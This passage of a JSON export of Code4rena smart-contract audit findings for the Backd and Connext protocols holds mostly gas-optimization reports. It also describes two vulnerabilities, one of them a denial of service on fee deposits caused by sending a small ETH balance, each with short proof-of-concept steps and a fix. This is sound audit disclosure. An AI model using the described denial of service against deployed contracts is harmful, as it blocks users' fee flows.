https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L41 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L45 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L50 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L54 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L111 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L99 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L104 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L147 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L58 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L70 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L92 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L136 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L167 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L342 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L408 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L435 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L449 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L469 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L86 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L92 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L33 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L62 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L81 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L89 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L63 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L70 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L81 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L216 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L229 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L239 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L256 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L278 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L75 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L82 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L87  ## Recommended Mitigation Steps  Add payable to these functions for gas savings  # [G-07] Use internal function in place of modifier  An internal function can save gas vs. a modifier. A modifier inlines the code of the original function but an internal function does not.  Source https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#dde7  Many modifiers can use this change https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L27 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/AuthorizationBase.sol#L16 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/AuthorizationBase.sol#L24 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/AuthorizationBase.sol#L32 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/AuthorizationBase.sol#L40 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/utils/Pausable.sol#L9 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/utils/Pausable.sol#L14 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L47 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/KeeperGauge.sol#L39  ## Recommended Mitigation Steps  Use internal functions in place of modifiers to save gas.  # [G-08] Use newer solidity version  Solidity version 0.8.10 is used. The latest release of solidity includes changes that can provide gas savings. The improvements include:  * Solidity version 0.8.13 can save more gas with [Yul IR pipeline](https://blog.soliditylang.org/2022/03/16/solidity-0.8.13-release-announcement/#yul-ir-pipeline-production-ready)  Source https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#upgrade-to-at-least-084  ## Recommended Mitigation Steps  Use solidity release 0.8.13 with Yul IR pipeline and other improvements for gas savings  # [G-09] Non-public variables save gas  Many immutable variables are public, but changing the visibility of any of these variables to private or internal can save gas.  https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L42 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/RewardHandler.sol#L20 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/RewardHandler.sol#L21 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L25 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L28 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/BkdToken.sol#L14 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L19 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L20 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L21 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L33 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L37 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L38 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L25 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L26 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L30 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L31 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L32 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L36 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L37 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L38 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L44 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L55 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L24 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L20 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L30 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/KeeperGauge.sol#L30 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/KeeperGauge.sol#L31 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L19 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L20 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L21 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L24 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L25 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L21 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L43 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L45 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L46  ## Recommended Mitigation Steps  Declare some public variables as private or internal to save gas  # [G-10] Use calldata instead of memory for function arguments  Using calldata instead of memory for function arguments saves gas sometimes. This can happen when a function is called externally and the memory array values are kept in `calldata` and copied to `memory` during ABI decoding (using the opcode `calldataload` and `mstore`). If the array is used in a for loop, `arr[i]` accesses the value in memory using a `mload`. If calldata is used instead, then instead of going via memory, the value is directly read from `calldata` using `calldataload`. That is, there are no intermediate memory operations that carries this value.  One case of function arguments using memory instead of calldata can use this improvement to save gas https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L43  Source https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#use-calldata-instead-of-memory-for-function-parameters  Related DoS issue https://twitter.com/danielvf/status/1519381832592199681  ## Recommended Mitigation Steps  Change function arguments from memory to calldata  # [G-11] Write contracts in vyper  The contracts are all written entirely in solidity. Writing contracts with vyper instead of solidity can save gas.  Source https://twitter.com/eiber_david/status/1515737811881807876  ## Recommended Mitigation Steps  Write some or all of the contracts in vyper to save gas"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/14", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## More efficient Struct packing of Market in the contract ComptrollerStorage.sol           The following structs could change the order of their stored elements to decrease memory uses.         and number of occupied slots. Therefore will save gas at every store and load from memory.          In ComptrollerStorage.sol, Market is optimized to: 3 slots from: 4 slots. The new order of types (you choose the actual variables):         1. uint256         2. mapping         3. bool         4. bool       ## Unnecessary equals boolean   Boolean variables can be checked within conditionals directly without the use of equality operators to true/false.  ### Code instances:          RoleManager.sol, 137: account == addressProvider.getAddress(AddressProviderKeys._POOL_FACTORY_KEY, false);         BkdTriHopCvx.sol, 169: if (_lpBalance() == 0) return false;         Vault.sol, 647: if (address(strategy) == address(0)) return false;         CvxCrvRewardsLocker.sol, 283: if (IERC20(CVX_CRV).balanceOf(address(this)) == 0) return false;         Vault.sol, 434: if (address(strategy) == address(0)) return false;    ## State variables that could be set immutable  In the following files there are state variables that could be set immutable to save gas.   ### Code instances:          _decimals in LpToken.sol         minter in LpToken.sol         token in StakerVault.sol         minWithdrawalDelay in VaultReserve.sol    ## Unused state variables  Unused state variables are gas consuming at deployment (since they are located in storage) and are  a bad code practice. Removing those variables will decrease deployment gas cost and improve code quality.  This is a full list of all the unused storage variables we found in your code base.   ### Code instances:          Errors.sol, INVALID_TOKEN_TO_REMOVE         AddressProviderKeys.sol, _REWARD_HANDLER_KEY         Errors.sol, ADDRESS_NOT_ACTION         Errors.sol, INVALID_INDEX         InterestRateModel.sol, isInterestRateModel    ## Unused declared local variables  Unused local variables are gas consuming, since the initial value assignment costs gas. And are  a bad code practice. Removing those variables will decrease the gas cost and improve code quality.  This is a full list of all the unused storage variables we found in your code base.   ### Code instances:          PoolMigrationZap.sol, migrate, ethValue_         RewardHandler.sol, burnFees, ethBalance         FeeBurner.sol, _depositInPool, ethBalance_    ## Caching array length can save gas   Caching the array length is more gas efficient. This is because access to a local variable in solidity is more efficient than query storage / calldata / memory. We recommend to change from:          for (uint256 i=0; i<array.length; i++) { ... }  to:       uint len = array.length       for (uint256 i=0; i<len; i++) { ... }   ### Code instances:          StakerVault.sol, actions, 259         InflationManager.sol, stakerVaults, 116         PoolMigrationZap.sol, newPools_, 22         VestedEscrow.sol, amounts, 94         PoolMigrationZap.sol, oldPoolAddresses_, 39    ## Prefix increments are cheaper than postfix increments  Prefix increments are cheaper than postfix increments.  Further more, using unchecked {++x} is even more gas efficient, and the gas saving accumulates every iteration and can make a real change There is no risk of overflow caused by increamenting the iteration index in for loops (the `++i` in `for (uint256 i = 0; i < numIterations; ++i)`). But increments perform overflow checks that are not necessary in this case. These functions use not using prefix increments (`++x`) or not using the unchecked keyword:   ### Code instance:          just change to unchecked: PoolMigrationZap.sol, i, 22    ## Unnecessary default assignment   Unnecessary default assignments, you can just declare and it will save gas and have the same meaning.       ### Code instances:          Vault.sol (L#43) : uint256 internal constant _INITIAL_STRATEGIST_FEE = 0.1e18;         Vault.sol (L#46) : uint256 public constant MAX_PERFORMANCE_FEE = 0.5e18;         Vault.sol (L#42) : uint256 internal constant _INITIAL_RESERVE_FEE = 0.01e18;         CvxCrvRewardsLocker.sol (L#43) : int128 private constant _CRV_INDEX = 0;         Vault.sol (L#44) : uint256 internal constant _INITIAL_PERFORMANCE_FEE = 0;     ## Rearrange state variables  You can change the order of the storage variables to decrease memory uses.  ### Code instances:  In VestedEscrow.sol,rearranging the storage fields can optimize to: 8 slots from: 9 slots. The new order of types (you choose the actual variables):         1. IERC20         2. uint256         3. uint256         4. uint256         5. uint256         6. uint256         7. address         8. bool         9. address  In KeeperGauge.sol,rearranging the storage fields can optimize to: 3 slots from: 4 slots. The new order of types (you choose the actual variables):         1. IController         2. uint256         3. address         4. uint48         5. bool     ## Use bytes32 instead of string to save gas whenever possible       Use bytes32 instead of string to save gas whenever possible.     String is a dynamic data structure and therefore is more gas consuming then bytes32.       ### Code instances:          Errors.sol (L22), string internal constant INVALID_IMPLEMENTATION = \"invalid pool implementation for given coin\";         Errors.sol (L59), string internal constant FAILED_MINT = \"mint failed\";         Errors.sol (L62), string internal constant NOTHING_TO_CLAIM = \"there is no claimable balance\";         Errors.sol (L55), string internal constant UNDERLYING_NOT_SUPPORTED = \"underlying token not supported\";         Errors.sol (L91), string internal constant STRATEGY_DOES_NOT_EXIST = \"Strategy does not exist\";    ## Short the following require messages  The following require messages are of length more than 32 and we think are short enough to short them into exactly 32 characters such that it will be placed in one slot of memory and the require  function will cost less gas.  The list:   ### Code instance:          Solidity file: Minter.sol, In line 150, Require message length to shorten: 38, The message: Maximum non-inflation amount exceeded.    ## Use != 0 instead of > 0   Using != 0 is slightly cheaper than > 0. (see https://github.com/code-423n4/2021-12-maple-findings/issues/75 for similar issue)   ### Code instances:          AmmConvexGauge.sol, 171: change 'amount > 0' to 'amount != 0'         StakerVault.sol, 323: change 'balance > 0' to 'balance != 0'         LiquidityPool.sol, 469: change 'underlyingAmount > 0' to 'underlyingAmount != 0'         InflationManager.sol, 602: change 'totalAmmTokenWeight > 0' to 'totalAmmTokenWeight != 0'         Controller.sol, 107: change 'balance > 0' to 'balance != 0'    ## Unnecessary cast        ### Code instances:          IController PoolFactory.sol.constructor - unnecessary casting IController(_controller)         IController LpGauge.sol.constructor - unnecessary casting IController(_controller)         address CompoundHandler.sol._repayAnyDebt - unnecessary casting address(ctoken)         IController LiquidityPool.sol.constructor - unnecessary casting IController(_controller)    ## Use unchecked to save gas for certain additive calculations that cannot overflow   You can use unchecked in the following calculations since there is no risk to overflow:  ### Code instances:          BkdLocker.sol (L#124) - stashedGovTokens[msg.sender].push( WithdrawStash(block.timestamp + currentUInts256[_WITHDRAW_DELAY], amount) );         Minter.sol (L#188) - totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));         AmmGauge.sol (L#89) - ammStakedIntegral_ += (controller.inflationManager().getAmmRateForToken(ammToken) * (block.timestamp - uint256(ammLastUpdated))).scaledDiv(totalStaked);         BkdLocker.sol (L#276) - newBoost += (block.timestamp - lastUpdated[user]) .scaledDiv(currentUInts256[_INCREASE_PERIOD]) .scaledMul(maxBoost - startBoost);         LpGauge.sol (L#69) - poolStakedIntegral_ += (inflationManager.getLpRateForStakerVault(address(stakerVault)) * (block.timestamp - poolLastUpdate)).scaledDiv(poolTotalStaked);    ## Consider inline the following functions to save gas       You can inline the following functions instead of writing a specific function to save gas.     (see https://github.com/code-423n4/2021-11-nested-findings/issues/167 for a similar issue.)       ### Code instances          ScaledMath.sol, scaledDiv, { return (a * DECIMAL_SCALE) / b; }         ExponentialNoError.sol, lessThanOrEqualExp, { return left.mantissa <= right.mantissa; }         Preparable.sol, _prepare, { return _prepare(key, value, _MIN_DELAY); }         AddressProviderHelpers.sol, getSafeRewardHandler, { return provider.getAddress(AddressProviderKeys._REWARD_HANDLER_KEY, false); }         TopUpKeeperHelper.sol, _positionToTopup, { return TopupData(user, position.account, position.protocol, position.record); }    ## Inline one time use functions   The following functions are used exactly once. Therefore you can inline them and save gas and improve code clearness.       ### Code instances:          ExponentialNoError.sol, sub_         BkdTriHopCvx.sol, _minLpAccepted         FeeBurner.sol, _swapperRouter         LiquidityPool.sol, _doTransferIn         CompoundHandler.sol, _getAccountBorrowsAndSupply    ## Cache powers of 10 used several times  You calculate the power of 10 every time you use it instead of caching it once as a constant variable and using it instead.  Fix the following code lines:   ### Code instances:  DecimalScale.sol, 22 : You should cache the used power of 10 as constant state variable since it's used several times (4):              return value / 10**(_DECIMALS - decimals);  DecimalScale.sol, 12 : You should cache the used power of 10 as constant state variable since it's used several times (4):              return value * 10**(_DECIMALS - decimals);  DecimalScale.sol, 20 : You should cache the used power of 10 as constant state variable since it's used several times (4):              return value * 10**(decimals - _DECIMALS);  DecimalScale.sol, 10 : You should cache the used power of 10 as constant state variable since it's used several times (4):              return value / 10**(decimals - _DECIMALS);     ## Change if -> revert pattern to require  Change if -> revert pattern to 'require' to save gas and improve code quality, if (some_condition) {          revert(revert_message)  }  to: require(!some_condition, revert_message)  In the following locations:  ### Code instance:          CTokenRegistry.sol, 62    ## Do not cache msg.sender   We recommend not to cache msg.sender since calling it is 2 gas while reading a variable is more.   ### Code instance:          https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L63  "}, {"title": "User rewards would be lost", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/12", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L103   # Vulnerability details  ## Impact Staking is not stopped even when Gauge is killed. User will not be getting any reward for the staked asset.  ## Proof of Concept 1. Assume the AMMGauge is killed using kill function (AmmGauge.sol#L49). This sets killed as true  2. poolCheckpoint will not further increase ammStakedIntegral and would simply return false  ``` function poolCheckpoint() public virtual override returns (bool) {         if (killed) {             return false;         }   ...   } ```  3. User calls stakeFor function and is still able to stake amount.   4. The drawback will be no rewards as poolCheckpoint will only return false and will not update ammStakedIntegral  ## Recommended Mitigation Steps Add below check in stakeFor function, restricting deposit if Gauge is killed  ``` require(!killed, \"Gauge killed\"); ```  "}, {"title": "BkdLocker depositFees can be blocked", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/8", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L50   # Vulnerability details  ## Impact burnFees will fail if none of the pool tokens have underlying token as native ETH token. This is shown below. Since burnFees fails so no fees is deposited in BKDLocker  ## Proof of Concept 1. Assume RewardHandler.sol has currently amount 5 as address(this).balance (ethBalance) (even attacker can send a small balance to this contract to do this dos attack) 2. None of the pools have underlying as address(0) so no ETH tokens and only ERC20 tokens are present 3. Now feeBurner.burnToTarget is called passing current ETH balance of amount 5 with all pool tokens 4. feeBurner loops through all tokens and swap them to WETH. Since none of the token is ETH so burningEth_ variable is false 5. Now the below require condition fails since burningEth_ is false   ``` require(burningEth_ || msg.value == 0, Error.INVALID_VALUE); ```  6. This fails the burnFees function.  ## Recommended Mitigation Steps ETH should not be sent if none of pool underlying token is ETH. Change it to something like below:  ``` bool ethFound=false; for (uint256 i; i < pools.length; i = i.uncheckedInc()) {             ILiquidityPool pool = ILiquidityPool(pools[i]);             address underlying = pool.getUnderlying();             if (underlying != address(0)) {                 _approve(underlying, address(feeBurner));             } else { ethFound=true; }             tokens[i] = underlying;         }  if(ethFound){         feeBurner.burnToTarget{value: ethBalance}(tokens, targetLpToken); } else { feeBurner.burnToTarget(tokens, targetLpToken); } ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/5", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/Preparable.sol#L143 Function _setConfig: No need to set deadlines[key] = 0; as this was already done in _executeDeadline function  ## https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L218 Function _mint: Check that amount is not equal to zero  ``` amount!=0 ```  Note: do same for mintNonInflationTokens  ## https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/LpGauge.sol#L59 Function claimRewards: Since amount is uint type so amount cannot be <0. Change it to    ``` if (amount == 0) return 0;  ```  Note: Same need to be fixed for other Gauge like AMMGauge  ## https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L214 Function claimFees: If claimable is zero, no need to go further  ``` require(claimable!=0); ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/2", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## cache in variables instead of loading  ### description   The code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas).   ### findings  array lengths should be cached  ``` /2022-05-backd/protocol/contracts/access/RoleManager.sol 82: for (uint256 i; i < roles.length; i = i.uncheckedInc()) { ```  ``` /2022-05-backd/protocol/contracts/RewardHandler.sol 42: for (uint256 i; i < pools.length; i = i.uncheckedInc()) { 259: for (uint256 i; i < actions.length; i = i.uncheckedInc()) { ```  ``` /2022-05-backd/protocol/contracts/tokenomics/FeeBurner.sol 56: for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) { ```  ``` /2022-05-backd/protocol/contracts/tokenomics/InflationManager.sol 116: for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) { ```  ``` /2022-05-backd/protocol/contracts/tokenomics/VestedEscrow.sol 94: for (uint256 i; i < amounts.length; i = i.uncheckedInc()) { ```  ## use calldata instead of memory  ### description  Use calldata instead of memory for function parameters saves gas if the function argument is only read.  ### findings  ``` /2022-05-backd/protocol/contracts/tokenomics/FeeBurner.sol 43: function burnToTarget(address[] memory tokens_, address targetLpToken_) ```  ## named returns and a return statement isn\u2019t necessary  ### description Removing unused named returns variables can reduce gas usage (MSTOREs/MLOADs) and improve code clarity. To save gas and improve code quality: consider using only one of those.  ### findings   ``` /2022-05-backd/protocol/contracts/tokenomics/FeeBurner.sol 47: returns (uint256 received) ```  ## using prefix increments save gas  ### description Prefix increments are cheaper than postfix increments, eg ++i rather than i++  ### findings  ``` /2022-05-backd/protocol/contracts/tokenomics/KeeperGauge.sol 98: epoch++; ```  ## use custom errors  ### description  use custom errors instead of revert strings  If the contract(s) in scope allow using Solidity >=0.8.4, consider using Custom Errors as they are more gas efficient while allowing developers to describe the error in detail using NatSpec.  ### findings  eg ``` /2022-05-backd/protocol/contracts/tokenomics/VestedEscrow.sol 82: require(!initializedSupply, \"Supply already initialized once\"); ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/261", "labels": ["bug", "duplicate", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "**Overview**  Risk Rating | Number of issues --- | --- Gas Issues | 16  **Table of Contents:**  - [1. Avoid unnecessary calculation when `_args.amount == 0`](#1-avoid-unnecessary-calculation-when-_argsamount--0) - [2. Cheap Contract Deployment Through Clones](#2-cheap-contract-deployment-through-clones) - [3. Avoid emitting a storage variable when a memory value is available](#3-avoid-emitting-a-storage-variable-when-a-memory-value-is-available) - [4. Reduce the size of error messages (Long revert Strings)](#4-reduce-the-size-of-error-messages-long-revert-strings) - [5. SafeMath is not needed when using Solidity version 0.8+](#5-safemath-is-not-needed-when-using-solidity-version-08) - [6. `>=` is cheaper than `>` (and `<=` cheaper than `<`)](#6--is-cheaper-than--and--cheaper-than-) - [7. Splitting `require()` statements that use `&&` saves gas](#7-splitting-require-statements-that-use--saves-gas) - [8. Using private rather than public for constants saves gas](#8-using-private-rather-than-public-for-constants-saves-gas) - [9. `<array>.length` should not be looked up in every loop of a `for-loop`](#9-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop) - [10. `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)](#10-i-costs-less-gas-compared-to-i-or-i--1-same-for---i-vs-i---or-i---1) - [11. Increments/decrements can be unchecked in for-loops](#11-incrementsdecrements-can-be-unchecked-in-for-loops) - [12. It costs more gas to initialize variables with their default value than letting the default value be applied](#12-it-costs-more-gas-to-initialize-variables-with-their-default-value-than-letting-the-default-value-be-applied) - [13. A variable should be immutable](#13-a-variable-should-be-immutable) - [14. Use Custom Errors instead of Revert Strings to save Gas](#14-use-custom-errors-instead-of-revert-strings-to-save-gas) - [15. Functions guaranteed to revert when called by normal users can be marked `payable`](#15-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable) - [16. Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`)](#16-use-scientific-notation-eg-1e18-rather-than-exponentiation-eg-1018)  ## 1. Avoid unnecessary calculation when `_args.amount == 0`  [Here](https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/BridgeFacet.sol#L762), if `_args.amount == 0` (which is possible), there should be a return statement to avoid unnecessary gas consumption:  ```solidity File: BridgeFacet.sol 762:     uint256 toSwap = _args.amount; // @audit-info [INFO] amount can be 0 meaning that this should return to avoid unnecessary gas consumption. Recommendation: add a if (_args.amount == 0) return; ```  ## 2. Cheap Contract Deployment Through Clones  ```solidity core/connext/facets/upgrade-initializers/DiamondInit.sol:73:      s.executor = new Executor(address(this)); ```  There's a way to save a significant amount of gas on deployment using Clones: <https://www.youtube.com/watch?v=3Mw-pMmJ7TA> .  This is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:  - <https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516> - <https://github.com/porter-finance/v1-core/pull/34>  Consider applying a similar pattern.  ## 3. Avoid emitting a storage variable when a memory value is available  When they are the same, consider emitting the memory value instead of the storage value:  ```solidity contracts/contracts/core/connext/helpers/ProposedOwnableUpgradeable.sol:   320    function _setProposed(address newlyProposed) private {   321      _proposedOwnershipTimestamp = block.timestamp;   322      _proposed = newlyProposed;   323:     emit OwnershipProposed(_proposed); //@audit should emit newlyProposed  contracts/contracts/core/shared/ProposedOwnable.sol:   169    function _setProposed(address newlyProposed) private {   170      _proposedOwnershipTimestamp = block.timestamp;   171      _proposed = newlyProposed;   172:     emit OwnershipProposed(_proposed);//@audit should emit newlyProposed   173    } ```  ## 4. Reduce the size of error messages (Long revert Strings)  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  Revert strings > 32 bytes:  ```solidity core/connext/helpers/OZERC20.sol:185:    require(_sender != address(0), \"ERC20: transfer from the zero address\"); core/connext/helpers/OZERC20.sol:186:    require(_recipient != address(0), \"ERC20: transfer to the zero address\"); core/connext/helpers/OZERC20.sol:190:    balances[_sender] = balances[_sender].sub(amount, \"ERC20: transfer amount exceeds balance\"); core/connext/helpers/OZERC20.sol:226:    require(_account != address(0), \"ERC20: burn from the zero address\"); core/connext/helpers/OZERC20.sol:230:    balances[_account] = balances[_account].sub(_amount, \"ERC20: burn amount exceeds balance\"); core/connext/helpers/OZERC20.sol:253:    require(_owner != address(0), \"ERC20: approve from the zero address\"); core/connext/helpers/OZERC20.sol:254:    require(_spender != address(0), \"ERC20: approve to the zero address\"); core/connext/libraries/LibDiamond.sol:66:    require(msg.sender == diamondStorage().contractOwner, \"LibDiamond: Must be contract owner\"); core/connext/libraries/LibDiamond.sol:113:        revert(\"LibDiamondCut: Incorrect FacetCutAction\"); core/connext/libraries/LibDiamond.sol:121:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\"); core/connext/libraries/LibDiamond.sol:123:    require(_facetAddress != address(0), \"LibDiamondCut: Add facet can't be address(0)\"); core/connext/libraries/LibDiamond.sol:132:      require(oldFacetAddress == address(0), \"LibDiamondCut: Can't add function that already exists\"); core/connext/libraries/LibDiamond.sol:139:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\"); core/connext/libraries/LibDiamond.sol:141:    require(_facetAddress != address(0), \"LibDiamondCut: Add facet can't be address(0)\"); core/connext/libraries/LibDiamond.sol:150:      require(oldFacetAddress != _facetAddress, \"LibDiamondCut: Can't replace function with same function\"); core/connext/libraries/LibDiamond.sol:158:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\"); core/connext/libraries/LibDiamond.sol:161:    require(_facetAddress == address(0), \"LibDiamondCut: Remove facet address must be address(0)\"); 